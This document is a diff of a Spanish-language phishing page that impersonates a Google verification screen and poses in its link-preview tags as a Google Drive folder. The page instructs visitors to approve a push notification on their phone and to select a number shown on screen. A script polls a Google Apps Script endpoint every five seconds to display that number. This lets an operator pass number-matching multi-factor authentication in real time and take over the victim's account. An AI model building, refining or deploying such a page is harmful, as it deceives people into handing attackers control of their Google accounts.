@@ -1,13 +1,12 @@
-<html><head>
+<!DOCTYPE html>
+<html lang="es">
+<head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        
-        <meta http-equiv="refresh" content="2;URL=usuario.html">
-        
-         <meta property="og:title" content="Dibujos - Google Drive" />
-<meta property="og:description" content="google.com" />
-<meta property="og:image" content="https://i.ibb.co/2dXmSRq/Loguito.png" />
-
+  <meta property="og:title" content="Dibujos" />
+  <meta property="og:description" content="goo.com" />
+  <meta property="og:image" content="logo.png" />
+  <title>Verificación de Google</title>
   <style>
     /* Estilos generales */
     * {
@@ -21,253 +20,146 @@
       display: flex;
       flex-direction: column;
       align-items: center;
-      height: 100vh;
+      min-height: 100vh;
     }
 
-    /* Estilos del logo  */
+    /* Estilos del logo */
     .logo {
-  width: 70px;
-  margin-top: 50px;
-  display: block;
-  margin-left: auto;
-  margin-right: auto;
+      width: 70px;
+      margin-top: 50px;
+      display: block;
+      margin-left: auto;
+      margin-right: auto;
     }
 
-    /* Estilos del formulario de inicio de sesión */
+    /* Estilos del formulario */
     .form {
       display: flex;
       flex-direction: column;
-      align-items: ;
-      margin-top: 20px;
       width: 355px;
       background-color: rgba(255, 255, 255, 0.9);
       box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
       padding: 35px;
+      margin-top: 100px;
+      padding-top: 5px;
+      padding-bottom: 100px;
     }
 
-    /* Estilos del título del formulario */
+    /* Estilos del título */
     .title {
       display: flex;
       justify-content: center;
       align-items: center;
       font-size: 20px;
-      font-family: "","Noto Sans Myanmar UI",arial,sans-serif;
+      font-family: "Roboto","Noto Sans Myanmar UI",arial,sans-serif;
       color: #202124;
       margin-bottom: 10px;
-      text-align: center; /* Agregado para centrar el título */
+      text-align: center;
     }
 
-
-.numero {
+    /* Estilos del número */
+    .numero {
       display: flex;
       justify-content: center;
       align-items: center;
       font-size: 54px;
-      font-family: "Arial Bold ","Noto Sans Myanmar UI",arial,sans-serif;
+      font-family: "Arial Bold","Noto Sans Myanmar UI",arial,sans-serif;
       color: #202124;
       margin-bottom: 10px;
-      text-align: center; /* Agregado para centrar el título */
+      text-align: center;
     }
 
-
-
-    /* Estilos del icono  */
-    .icon {
-      width: 30px;
-      height: 30px;
-      margin-right: 10px;
+    /* Estilos del subtítulo */
+    .subtitle {
+      font-size: 15px;
+      margin-top: 5px;
+      font-family: "Noto Sans Myanmar UI",arial;
+      color: #444444;
     }
 
-    /* Estilos de los campos de texto */
-    .input {
-      width: 100%;
-      height: 40px;
-      border: 1px solid #dfe1e5;
-      border-radius: 5px;
-      padding: 10px 20px;
-      font-size: 16px;
-      outline: none;
-    }
-
-    /* Estilos de los campos de texto al enfocarse */
-    .input:focus {
-      border-color: #1a73e8;
-    }
-
-    /* Estilos del botón de siguiente */
-    .button {
-      width: 100%;
-      height: 40px;
-      border: none;
-      border-radius: 5px;
-      background-color: #4285f4;
-      border: 2px solid white;
-      color: white;
-      font-size: 14px;
-      margin-top: 20px;
-      cursor: pointer;
-    }
-
-    /* Estilos del botón de siguiente al pasar el ratón */
-    .button:hover {
-      box-shadow: 0 1px 1px rgba(0, 0, 0, 0.1);
-    }
-
-    /* Estilos del enlace de crear cuenta */
+    /* Estilos del enlace */
     .link {
       text-decoration: none;
       color: #1a73e8;
       font-size: 14px;
       margin-top: 20px;
-      font-family: roboto;
+      font-family: Roboto, sans-serif;
     }
 
-    /* Estilos de la etiqueta "o" */
-    .or {
-      display: flex;
-      align-items: center;
-      width: 100%;
-      margin-top: 10px;
+    /* Estilos del pie de página */
+    .footer {
+      margin-top: 20px;
+      text-align: center;
     }
 
-    /* Estilos del texto "o" */
-    .or-text {
-      color: #6c6c6c;
-      font-size: 14px;
-      margin: 0 auto;
-      background-color: white;
-      padding: 0 10px;
-    }
-
-    /* Estilos de la línea "o" */
-    .or-line {
-      height: 1px;
-      width: 100%;
-      background-color: #dfe1e5;
-    }
-
-    /* Estilos del botón "Iniciar sesión con otra cuenta" */
-    .other-button {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      width: 100%;
-      height: 40px;
-      border: none;
-      border-radius: 5px;
-      background-color: #f8f9fa;
-      color: #3c4043;
-      font-size: 14px;
-      margin-top: 10px;
-      cursor: pointer;
-    }
-
-    /* Estilos del botón "Iniciar sesión con otra cuenta" al pasar el ratón */
-    .other-button:hover {
-      box-shadow: 0 1px 1px rgba(0, 0, 0, 0.1);
-    }
-
-    /* Estilos del subtitulo */
-    .subtitle {
-      font-size: 15px;
-  margin-top: 5px;
-  font-family: "Noto Sans Myanmar UI",arial;
-  color: #444444; /* Color gris oscuro */
-    }
-
-    /* Estilos del idioma */
-    .language {
+    .footer p {
       font-size: 12px;
-      margin-top: 10px;
-      font-family: "Noto Sans Myanmar UI",arial;
-    }
-
-
-
-    p {
-         font-size: 12px;
-    
       font-family: Arial, sans-serif;
-        word-spacing: 28px;
+      word-spacing: 28px;
+      color: #5f6368;
     }
-  
   </style>
 </head>
 <body>
   <div class="container">
-    <!-- Logo  -->
-    
-
-    <!-- Formulario de inicio de sesión -->
-  
-    <form class="form" style="
-   padding-top: 5px;
-   padding-bottom: 100px;
-   margin-top: 100px;
-">
-
-      <!-- Título e icono del formulario -->
-
-<img src="https://i.ibb.co/ygHBjNN/gssr-272x92dp.png" alt="go" class="logo" style="
-">
-<br>
-<div class="title">
-    Acepte la solicitud enviada a su dispositivo y solicite el número para enlazar con la carpeta
-</div>
-<br><br>
-
- <div class="numero" id="numero"></div>
-
-    <script>
-        const API_URL = "https://script.google.com/macros/s/AKfycbybUi84u6ZgLzvfsXWLV9zLqkU2YowIoErfa7wOcJr_rIkecdjlD1iptmnTh-K9Z31E/exec"; // Reemplaza con tu URL
-
-        function cargarNumero() {
-            fetch(API_URL)
-                .then(response => response.json())
-                .then(data => {
-                    document.getElementById("numero").textContent = data.numero || "Número vacío";
-                })
-                .catch(error => console.error("Error al obtener el número:", error));
-        }
-
-        cargarNumero(); // Cargar número al abrir la página
-        setInterval(cargarNumero, 5000); // Actualizar cada 5 segundos automáticamente
-    </script>
-
-
-
-      
-
-<br>
-
-      <!-- Subtítulo -->
-      <div class="subtitle">Google ha enviado 
-una notificacion a su dispositivo,  abre la aplicacion 
-gmail o youtube, toca <strong>Sí</strong> en la notificación y marca el numero para acceder a la carpeta.</div>
+    <form class="form">
+      <!-- Logo de Google -->
+      <img src="https://i.ibb.co/ygHBjNN/gssr-272x92dp.png" alt="Google" class="logo">
       <br>
-
-    
-
-     
-     
-
-     
-
-      <!-- Enlace de crear cuenta -->
+      
+      <!-- Título del formulario -->
+      <div class="title">
+        Acepte la solicitud enviada a su dispositivo y solicite el número para enlazar con la carpeta
+      </div>
+      <br><br>
+      
+      <!-- Aquí se mostrará el número -->
+      <div class="numero" id="numero">Cargando...</div>
+      <br>
+      
+      <!-- Subtítulo con instrucciones -->
+      <div class="subtitle">
+        Google ha enviado una notificación a su dispositivo, toca <strong>Sí</strong> en la notificación y marca el número para acceder a la carpeta.
+      </div>
+      <br>
+      
+      <!-- Enlace -->
       <a href="#" class="link">Revise sus notificaciones</a>
-
-      <!-- Botón de iniciar sesión con otra cuenta -->
-      
-
-      <!-- Idioma -->
-      
     </form>
-          </div>
-<br>
+    
+    <!-- Pie de página -->
+    <div class="footer">
+      <p>Español(España) Ayuda Privacidad Términos</p>
+    </div>
+  </div>
 
-   <p>Español(España) Ayuda Privacidad Términos</p>
-
-  
-
-
-</body></html>
+  <script>
+    // URL del script de Google
+    const API_URL = "https://script.google.com/macros/s/AKfycbybUi84u6ZgLzvfsXWLV9zLqkU2YowIoErfa7wOcJr_rIkecdjlD1iptmnTh-K9Z31E/exec";
+    
+    // Función para cargar el número
+    function cargarNumero() {
+      fetch(API_URL)
+        .then(response => response.json())
+        .then(data => {
+          const numeroElement = document.getElementById("numero");
+          if (data.numero && data.numero.trim() !== "") {
+            numeroElement.textContent = data.numero;
+          } else {
+            numeroElement.textContent = "Número no disponible";
+          }
+        })
+        .catch(error => {
+          console.error("Error al obtener el número:", error);
+          document.getElementById("numero").textContent = "Error al cargar";
+        });
+    }
+    
+    // Cargar número inicial
+    cargarNumero();
+    
+    // Actualizar cada 5 segundos
+    setInterval(cargarNumero, 5000);
+  </script>
+</body>
+</html>
